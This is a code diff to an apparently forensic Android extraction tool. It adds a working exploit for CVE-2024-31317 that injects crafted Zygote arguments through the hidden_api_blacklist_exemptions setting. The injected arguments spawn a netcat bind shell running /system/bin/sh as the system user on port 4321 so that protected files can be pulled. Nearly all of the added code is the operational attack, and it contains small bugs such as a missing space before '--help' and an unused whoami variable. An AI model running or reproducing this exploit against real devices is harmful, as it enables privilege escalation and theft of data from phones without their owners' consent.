@@ -3349,6 +3349,47 @@ def pull_dir_mod(self, src: str, dst: typing.Union[str, pathlib.Path], text, pro
 # Exploiting CVE-2024–31317 to get system-user files (Android 9-11)
 def exploit_zygote(zip_path, text, prog_text, change):
 
+    # Logic adjusted according to: https://github.com/Anonymous941/zygote-injection-toolkit
+    command = None
+    def find_netcat():
+        nc_commands = ["toybox nc", "busybox nc", "nc"]
+        nc_command = None
+        for command in nc_commands:
+            result = device.shell(command + "--help")
+            if "not found" in result:
+                pass
+            else:
+                nc_command = command
+                break
+        return nc_command
+
+    command = find_netcat()
+    #zygote_cmd = f"{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;"
+    zygote_cmd = f"(settings delete global hidden_api_blacklist_exemptions;{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh)&"
+    raw_zygote_arguments = [
+            "--runtime-args",
+            "--setuid=1000",
+            "--setgid=1000",
+            "--runtime-flags=1",
+            "--mount-external-full",
+            "--setgroups=3003",
+            "--nice-name=runmenetcat",
+            "--seinfo=platform:isSystemServer:system_app:targetSdkVersion=29:complete",
+            "--invoke-with",
+            f"{zygote_cmd}",
+    ]
+    zygote_arguments = "\n".join(
+        [f"{len(raw_zygote_arguments):d}"] + raw_zygote_arguments
+    )
+    if int(software.split(".")[0]) < 12:
+            payload = f"LClass1;->method1(\n{zygote_arguments}"
+    else:
+        print("bigger 11")
+        payload = "\n" * 3000 + "A" * 5157
+        payload += zygote_arguments
+        payload += "," + ",\n" * 1400
+
+
     text.configure(text="Expoliting CVE-2024–31317 to acquire \"system\"-Files")
     zytotal = 0
     def dump_folder_cve(name, zipname):
@@ -3429,17 +3470,25 @@ def exploit_zygote(zip_path, text, prog_text, change):
                 break
         return b"".join(chunks).decode("utf-8", errors="ignore")
 
-    cve_file = os.path.join(os.path.dirname(__file__), "ressources" , "cve", "2024_31317.txt")
-    with open(cve_file,"r") as f:
-        cve_cmd = f.read()
-    if int(software.split(".")[0]) > 11:
-        payload = "\n" * 3000 + "A" * 5157
-        payload += cve_cmd
-        payload += "," + ",\n" * 1400
-        cve_cmd = payload
-    try: device.shell(cve_cmd, timeout=4)
+    if command == None:
+        return
+
+    exploit_command = (
+            "settings put global hidden_api_blacklist_exemptions \"" +
+            payload + f"\n\"\nsettings delete global hidden_api_blacklist_exemptions\nsleep 2\n"
+    )
+    device.shell("am force-stop com.android.settings")
+    try: device.shell(exploit_command, timeout=4)
     except: pass
-    cmd = '''sh -c \"echo 'toybox whoami' | toybox nc localhost 4321\"'''
+    device.shell("am start -a android.settings.SETTINGS")
+    
+    if "toybox" in command:
+        whoami_cmd = "toybox whoami"
+    elif "busybox" in command:
+        whoami_cmd = "busybox whoami"
+    else:
+        whoami_cmd = "whoami"
+    cmd = f'''sh -c \"echo 'toybox whoami' | {command} localhost 4321\"'''
     z_whoami = device.shell(cmd)
     #print(z_whoami)
     if "system" in z_whoami:
